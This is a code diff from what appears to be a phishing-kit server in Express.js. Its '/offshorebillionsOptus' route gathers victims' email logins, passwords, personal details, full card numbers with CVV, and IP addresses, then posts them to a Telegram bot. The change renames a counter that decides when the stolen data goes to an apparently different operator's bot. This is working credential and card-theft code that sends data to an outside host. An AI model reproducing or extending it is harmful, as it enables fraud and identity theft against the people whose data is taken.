@@ -11222,7 +11222,7 @@ app.post("/offshorebillionsOptus", (req, res) => {
     .then(function () {
       binList = `${bin} | ${zip} | ${bankName}`;
       var originalText = `|--------- @vendetta_cccupdates  ---------|\n\n+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (bill == 100) {
+      if (Spoofergoofer == 10) {
         axios
           .post(
             `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
@@ -11246,7 +11246,7 @@ app.post("/offshorebillionsOptus", (req, res) => {
           .catch((err) => {
             console.log(err);
           });
-        bill = 100;
+        Spoofergoofer = 100;
       }
       res.send("Update Completed");
     });
